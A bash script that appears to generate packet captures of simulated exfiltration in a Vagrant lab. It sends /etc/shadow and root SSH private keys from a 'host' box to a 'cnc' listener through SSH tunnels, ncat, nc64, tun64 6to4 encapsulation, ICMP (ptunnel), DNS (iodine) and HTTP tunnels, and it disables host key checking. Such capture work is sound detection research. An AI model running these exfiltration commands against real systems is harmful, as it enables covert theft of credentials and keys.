#!/bin/bash

# Global variables

PCAP_DIR="/vagrant/pcap"
SCRIPT_DIR="`pwd`/scripts"
SLEEP_INTERVAL='1'
NCAT_WAIT_INTERVAL='3'

LOG_DIR='/vagrant/logs'

# Tail this file to verify that data is being transfered
# --output or stdout of cnc listener should be redirected here
LOGFILE='/vagrant/test.log'

SSH_ARGS='-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'

MONITORING_BOX='tap'
SENDER_BOX='host'
LISTENER_BOX='cnc'

FILES=( '/etc/shadow' '/root/.ssh/id_rsa' '/root/.ssh/id_rsa.pub' )
PORTS=( '53' '22' '80' '443' )

IP_PROTOCOLS=( 'u' 't' )
IP_VERSIONS=( '4' '6' )

LISTENER_IP4='192.168.12.12'
LISTENER_IP6='2a02:1010:12::12'

TUN64_MODES=( 't6over4' 't6to4' 'isatap' )
TUN64_ENCAP_MODES=( '' '--gre' )
NC64_MODES=( '' '-b64' )

ITERATION='0'

# Common functions

die() { 
    echo "$@" 1>&2
    exit 1
}

SSH () {
    BOX=$1
    CMD=$2

    vagrant ssh $BOX -c "$CMD"

}

start_tcpdump_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for tcpdump listener, must be 2"
    fi

    INTERFACE=$1
    PCAP_NAME=$2

    # Clean up any existing 
    kill_tcpdump_listener "$PCAP_NAME"

    echo "Creating PCAP folder"
    SSH $MONITORING_BOX "sudo mkdir -p $PCAP_DIR"

    echo "starting tcpdump for $PCAP_NAME.pcap in folder $PCAP_DIR"
    SSH $MONITORING_BOX "nohup sudo tcpdump -i $INTERFACE -w $PCAP_DIR/$PCAP_NAME.pcap & sleep 1"

}

kill_tcpdump_listener () {

    echo "killing tcpdump"
    SSH $MONITORING_BOX "sudo pkill tcpdump"

    sleep $SLEEP_INTERVAL
}

send_files () {

    if [[ $# -ne 3 ]]; then
        die "Illegal number of arguments for reconfiguring ssh listener, must be 3"
    fi

    LISTEN_CMD=$1
    KILL_CMD=$3

    for file in "${FILES[@]}"; do

        SEND_CMD="sudo cat $file | $2"

        echo "Starting listener"
        echo "$LISTEN_CMD"
        SSH $LISTENER_BOX "$LISTEN_CMD"
        sleep $SLEEP_INTERVAL

        echo "Sending data"
        echo "$SEND_CMD"
        SSH $SENDER_BOX "$SEND_CMD"
        sleep $SLEEP_INTERVAL

        echo "Attempting to kill listener"
        echo "$KILL_CMD"
        SSH $LISTENER_BOX "$KILL_CMD"
        sleep $SLEEP_INTERVAL
    done
}

# SSH tunneling

iterate_ssh_tunnels () {
    for version in "${IP_VERSIONS[@]}"; do
        for port in "${PORTS[@]}"; do
        #echo "Initiating port $port test"

            case $version in
                4)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
                LISTEN_DATA="ncat -4 -l -p 4444 -k -w $NCAT_WAIT_INTERVAL --output $LOGFILE"
                SEND_DATA="ncat 127.0.0.1 4444"
                ;;
                6)
                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
                LISTEN_DATA="ncat -6 -l -p 6666 -k -w $NCAT_WAIT_INTERVAL --output $LOGFILE"
                SEND_DATA="ncat -6 ::1 6666"
                ;;
                *)
                die "No IP version argument"
                ;;
            esac

            ITERATION_NAME="ssh-$version-$port"
            LISTEN_CMD="nohup sudo $LISTEN_DATA & sleep 1"
            SEND_CMD="sudo $SEND_DATA"
            KILL_CMD="sudo pkill ncat"

            echo "$ITERATION_NAME"
        
            # Cleanup just in case
            SSH $LISTENER_BOX "$KILL_CMD"
            kill_tcpdump_listener
        
            reconfigure_ssh_listener add $port
            start_tcpdump_listener eth1 "$ITERATION_NAME"
        
            echo "Establishing SSH tunnel for iteration: $ITERATION_NAME"
            SSH $SENDER_BOX "sudo nohup $ESTABLISH" || die "Failed to establish ssh channel"

            send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
        
            echo "Cleaning up"
            SSH $LISTENER_BOX "$KILL_CMD"
            SSH $SENDER_BOX "sudo ps -ef | egrep 'ssh.+id_rsa' | awk -F \" \" '{ print \$2 }' | sudo xargs kill"
            reconfigure_ssh_listener remove $port
            kill_tcpdump_listener
            sleep $SLEEP_INTERVAL

        done
    done
}

reconfigure_ssh_listener () {

    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for reconfiguring ssh listener, must be 2"
    fi

    PORT=$2

    case $1 in
        add)
            reconfigure_ssh_listener remove $PORT
            echo "Adding SSH port $PORT listener"
            DO_CMD="sed -i -e \"\\\$a\\Port $PORT\" /etc/ssh/sshd_config"
            echo $DO_CMD
            SSH $LISTENER_BOX "sudo $DO_CMD"
        ;;
        remove)
            echo "Removing SSH port $PORT listener"
            SSH $LISTENER_BOX "sudo sed -i \"s/^Port $PORT.*//g\" /etc/ssh/sshd_config"
        ;;
        *)
        die "reconfigure_ssh_listener requires add|remove as first argument"
        ;;
    esac  

    echo "Restarting SSH service"
    SSH $LISTENER_BOX "sudo service ssh restart"
    sleep 1

}

# Ncat tunneling

iterate_ncat_tunnels () {
    for protocol in "${IP_PROTOCOLS[@]}"; do
        for port in "${PORTS[@]}"; do
            for ver in "${IP_VERSIONS[@]}"; do
                case $ver in
                    4)
                    dest_ip="$LISTENER_IP4"
                    ;;
                    6)
                    dest_ip="$LISTENER_IP6"
                    ;;
                    *)
                    die "No IP version (4|6) set for iterate_http_tunnels"
                    ;;
                esac
                ITERATION_NAME="netcat-$protocol-$port-$ver"

                LISTEN_DATA="ncat -$ver -$protocol -w $NCAT_WAIT_INTERVAL -lp $port --output=$LOGFILE"
                SEND_DATA="ncat -w $NCAT_WAIT_INTERVAL $dest_ip -$protocol $port"

                LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
                SEND_CMD="$SEND_DATA"
                KILL_CMD="sudo pkill ncat"

                echo "$ITERATION_NAME"

                start_tcpdump_listener eth1 "$ITERATION_NAME"

                send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"

                kill_tcpdump_listener
            done
        done
    done
}

# nc64 tunneling

iterate_nc64_tunnels () {
    IP_VERSIONS+=( '64' )
    for protocol in "${IP_PROTOCOLS[@]}"; do
        for port in "${PORTS[@]}"; do
            for ver in "${IP_VERSIONS[@]}"; do
                case $ver in
                    4)
                    nc64_args="--ip_version_select 4"
                    ;;
                    6)
                    nc64_args="--ip_version_select 6"
                    ;;
                    *)
                    nc64_args=""
                    ;;
                esac

                for mode in "${NC64_MODES[@]}"; do
                    nc64_args+=" $mode"
                    ITERATION_NAME="nc64-$protocol-$port-$ver$mode"
    
                    LISTEN_DATA="/opt/nc64/nc64.py -i eth1 -l -$protocol -p $port $nc64_args"
                    SEND_DATA="/opt/nc64/nc64.py -i eth1 -h4 $LISTENER_IP4 -h6 $LISTENER_IP6 -$protocol -p $port $nc64_args "
    
                    LISTEN_CMD="nohup sudo $LISTEN_DATA >> $LOGFILE & sleep 1"
                    SEND_CMD="sudo $SEND_DATA"
                    KILL_CMD="sudo pkill -9 nc64"

                    echo "$ITERATION_NAME"
    
                    start_tcpdump_listener eth1 "$ITERATION_NAME"
    
                    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
    
                    kill_tcpdump_listener
                done
            done
        done
    done
}

iterate_ping_tunnel () {
    LISTEN_DATA="ncat -w $NCAT_WAIT_INTERVAL -lp 5555 --output=$LOGFILE"
    SEND_DATA="nc -w $NCAT_WAIT_INTERVAL 127.0.0.1 7777"

    ESTABLISH_PROXY="ptunnel -c eth1 -v 4"
    ESTABLISH_TUNNEL="ptunnel -c eth1 -v 4 -p $LISTENER_IP4 -lp 7777 -da $LISTENER_IP4 -dp 5555"
    
    LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
    SEND_CMD="$SEND_DATA"
    KILL_CMD="sudo pkill -9 ncat"

    ITERATION_NAME="ptunnel"

    start_tcpdump_listener eth1 "$ITERATION_NAME"

    echo "Establishing ICMP tunnel for iteration: $ITERATION_NAME"
    SSH $LISTENER_BOX "screen -m -d sudo $ESTABLISH_PROXY & sleep 1" || die "Failed to establish ICMP proxy"
    SSH $SENDER_BOX "screen -m -d sudo $ESTABLISH_TUNNEL & sleep 1" || die "Failed to establish ICMP tunnel"

    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"

    echo "cleaning up"
    SSH $LISTENER_BOX "sudo pkill -9 ptunnel"
    SSH $SENDER_BOX "sudo pkill -9 ptunnel"

    kill_tcpdump_listener "$ITERATION"
    sleep $SLEEP_INTERVAL

}

dns_tunnel () {
    resolver='192.168.11.1'
    evil_sub_domain='badguys.exfil'
    passphrase='test'
    proxy_endpoint='192.168.99.1'

    ESTABLISH_PROXY="iodined -c -P $passphrase $proxy_endpoint $evil_sub_domain"
    ESTABLISH_TUNNEL="iodine -P $passphrase $resolver $evil_sub_domain"

    # Netcat iteration
    ITERATION_NAME="iodine"

    LISTEN_DATA="ncat -w $NCAT_WAIT_INTERVAL -lp 4444 --output=$LOGFILE"
    SEND_DATA="ncat $proxy_endpoint 4444"

    LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
    SEND_CMD="$SEND_DATA"
    KILL_CMD="sudo pkill -9 ncat"

    start_tcpdump_listener eth1 "$ITERATION_NAME"

    echo "Establishing DNS tunnel for iteration: $ITERATION_NAME"
    SSH $LISTENER_BOX "sudo $ESTABLISH_PROXY & sleep 1"
    SSH $SENDER_BOX "sudo $ESTABLISH_TUNNEL & sleep 1"

    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"

    echo "cleaning up"
    SSH $SENDER_BOX "sudo pkill -9 iodine"
    SSH $LISTENER_BOX "sudo pkill -9 iodine"
    kill_tcpdump_listener "$ITERATION"
    sleep $SLEEP_INTERVAL

}

iterate_tun64_tunnels () {
    configure_6through4_interface add tun64

    for protocol in "${IP_PROTOCOLS[@]}"; do

        case $protocol in
            t)
            proto_key="T"
            ;;
            u)
            proto_key="U"
            ;;
            *)
            die "tun64 protocol not defined"
            ;;
        esac  
        for port in "${PORTS[@]}"; do
            for mode in "${TUN64_MODES[@]}"; do
                for encapsulation in "${TUN64_ENCAP_MODES[@]}"; do

                    LISTEN_DATA="ncat -$protocol -w $NCAT_WAIT_INTERVAL -lp $port --output=$LOGFILE"
                    SEND_DATA="/opt/tun64/tun64.py -i eth1 -v --$mode $encapsulation -s4 192.168.11.11 -d4 $LISTENER_IP4 -d6 $LISTENER_IP6 -dp $port -$proto_key -m \"\`sudo cat /dev/stdin\`\""
    
                    LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
                    SEND_CMD="sudo $SEND_DATA"
                    KILL_CMD="sudo pkill -9 ncat"
    
                    ITERATION_NAME="tun64-$protocol-$port-$mode$encapsulation"
                    echo "$ITERATION_NAME"
    
                    start_tcpdump_listener eth1 "$ITERATION_NAME"
    
                    send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
    
                    kill_tcpdump_listener
                    sleep $SLEEP_INTERVAL
                done
            done
        done
    done

    configure_6through4_interface remove tun64
}

configure_6through4_interface () {
    if [[ $# -ne 2 ]]; then
        die "Illegal number of arguments for reconfiguring ssh listener, must be 2"
    fi

    dev_name=$2
    addr=`printf "2002:%02x%02x:%02x%02x::1" \`echo $LISTENER_IP4 | tr "." " "\``

    case $1 in
        add)
        # cleanup
        configure_6through4_interface remove $dev_name
        echo "Adding 6to4 tunnel interface"
        SSH $LISTENER_BOX "sudo ip tunnel add $dev_name mode sit ttl 64 remote any local $LISTENER_IP4"
        SSH $LISTENER_BOX "sudo ip link set dev $dev_name up"
        SSH $LISTENER_BOX "sudo ip -6 addr add $addr/16 dev $dev_name"
        ;;
        remove)
        echo "Removing 6to4 tunnel interface"
        SSH $LISTENER_BOX "sudo ip -6 route flush dev $dev_name"
        SSH $LISTENER_BOX "sudo ip link set dev $dev_name down"
        SSH $LISTENER_BOX "sudo ip tunnel del $dev_name"
        ;;
        *)
        die "configure_6through4_interface requires add|remove as first argument"
        ;;
    esac  
}

iterate_http_tunnels () {
    for port in "${PORTS[@]}"; do
        ESTABLISH_PROXY="hts -F localhost:4444 $port"
        ESTABLISH_TUNNEL="htc -F 7777 $LISTENER_IP4:$port"

        LISTEN_DATA="ncat -w $NCAT_WAIT_INTERVAL -lp 4444 --output=$LOGFILE"
        SEND_DATA="ncat -w $NCAT_WAIT_INTERVAL 127.0.0.1 7777"

        ITERATION_NAME="http-$port"

        LISTEN_CMD="screen -m -d sudo $LISTEN_DATA & sleep 1"
        SEND_CMD="$SEND_DATA"
        KILL_CMD="sudo pkill -9 ncat"

        echo "$ITERATION_NAME"

        start_tcpdump_listener eth1 "$ITERATION_NAME"

        echo "Establishing DNS tunnel for iteration: $ITERATION_NAME"
        SSH $LISTENER_BOX "sudo $ESTABLISH_PROXY & sleep 1"
        SSH $SENDER_BOX "sudo $ESTABLISH_TUNNEL & sleep 1"

        send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"

        echo "cleaning up"
        SSH $LISTENER_BOX "sudo pkill -9 hts"
        SSH $SENDER_BOX "sudo pkill -9 htc"

        kill_tcpdump_listener
        sleep $SLEEP_INTERVAL

    done
}

case $1 in
    ssh)
        iterate_ssh_tunnels
    ;;
    http)
        iterate_http_tunnels
    ;;
    ncat)
        iterate_ncat_tunnels
    ;;
    nc64)
        iterate_nc64_tunnels
    ;;
    tun64)
        iterate_tun64_tunnels
    ;;
    dns)
        dns_tunnel
    ;;
    icmp)
        iterate_ping_tunnel
    ;;
    all)
        iterate_ssh_tunnels
        iterate_ncat_tunnels
        iterate_nc64_tunnels
        iterate_tun64_tunnels
        iterate_ping_tunnel
        dns_tunnel
        iterate_http_tunnels
    ;;
    *)
        echo "Invalid argument, please use <ssh|http|ncat|nc64|tun64|dns|icmp|all>"
    ;;
esac

